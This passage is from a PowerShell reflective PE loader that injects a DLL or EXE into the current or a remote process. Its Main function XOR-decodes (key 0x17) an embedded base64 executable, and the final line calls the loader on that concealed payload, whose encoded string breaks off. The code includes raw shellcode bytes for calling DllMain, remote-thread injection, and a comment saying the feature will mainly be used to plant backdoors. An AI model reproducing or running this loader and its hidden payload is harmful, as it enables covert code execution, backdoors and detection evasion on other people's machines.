		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXBxYXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxcAtU9ZRNQhCkTUIQpE1CEKN7YiC07UIQo3tiQLxtQhCje2JQtW1CEKK6KLCkLUIQoror8KRdQhCtp05gpF1CEKnbYiC1DUIQqdtiQLW9QhCp22JQtV1CEKN7YgC1fUIQpE1CAK7tQhCo+3KAtQ1CEKj7chC0XUIQqPtyMLRdQhCkV+dH9E1CEKFxcXFxcXFxdHUhcXWxYTFyMBD00XFxcXFxcXF/cXFTYcFhkcF6cWFxfBFxcXFxcXJL4XFxcHFxcX1xYXFxcXBxcHFxcXFRcXERcXFxcXFxcRFxcXFxcXFxenFRcXExcXFxcXFxUXVxYXFwcXFwcXFxcXBxcXBxcXFxcXFwcXFxfHRBUXKxYXFxtCFRffFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF4cVFx8BFxeHUBUXCxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF6dQFRdXFxcXFxcXFxcXFxcX1xYXkxUXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzljcm9jFxcXSrgWFxcHFxcXpxYXFxMXFxcXFxcXFxcXFxcXFzcXF3c5ZXN2Y3YXF721FxcX1xYXF7MXFxejFhcXFxcXFxcXFxcXFxdXFxdXOXN2Y3YXFxdvDxcXF2cVFxcZFxcXTxUXFxcXFxcXFxcXFxcXVxcX1zllcnt4dBcXHwEXFxeHFRcXDxcXF3EVFxcXFxcXFxcXFxcXF1cXF1UXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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